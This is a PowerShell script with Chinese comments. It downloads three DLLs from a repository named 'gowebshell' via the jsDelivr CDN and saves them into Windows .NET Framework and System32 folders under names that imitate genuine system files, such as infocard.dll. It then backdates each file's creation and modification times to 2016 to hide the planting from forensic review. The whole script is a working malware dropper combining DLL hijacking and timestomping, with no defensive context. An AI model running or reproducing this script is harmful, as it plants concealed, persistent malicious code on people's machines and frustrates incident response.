# 定义要下载的文件列表
$fileList = @(
    @{
        Url = "https://cdn.jsdelivr.net/gh/gowebshell/gotojs/bye/8082/x64.dll"
        OutputPath = "C:\Windows\Microsoft.NET\Framework64\v2.0.50727\mscorst64.dll"
        CreationTime = Get-Date "2016-07-16 21:18:00"
        ModificationTime = Get-Date "2016-07-16 21:18:00"
    },
    @{
        Url = "https://cdn.jsdelivr.net/gh/gowebshell/gotojs/bye/8082/x32.dll"
        OutputPath = "C:\Windows\Microsoft.NET\Framework\v2.0.50727\mscorst.dll"
        CreationTime = Get-Date "2016-07-17 10:30:00"
        ModificationTime = Get-Date "2016-07-17 10:30:00"
    },
    @{
        Url = "https://cdn.jsdelivr.net/gh/gowebshell/gotojs@9eb089716417004a7373fbe087a5e7f007fad678/infocard.dll"
        OutputPath = "C:\Windows\System32\infocard.dll"
        CreationTime = Get-Date "2016-07-18 14:45:00"
        ModificationTime = Get-Date "2016-07-18 14:45:00"
    }
)

# 下载并设置文件的创建时间和修改时间
foreach ($fileInfo in $fileList) {
    Invoke-WebRequest -Uri $fileInfo.Url -OutFile $fileInfo.OutputPath
    Set-ItemProperty -Path $fileInfo.OutputPath -Name CreationTime -Value $fileInfo.CreationTime
    Set-ItemProperty -Path $fileInfo.OutputPath -Name LastWriteTime -Value $fileInfo.ModificationTime
}
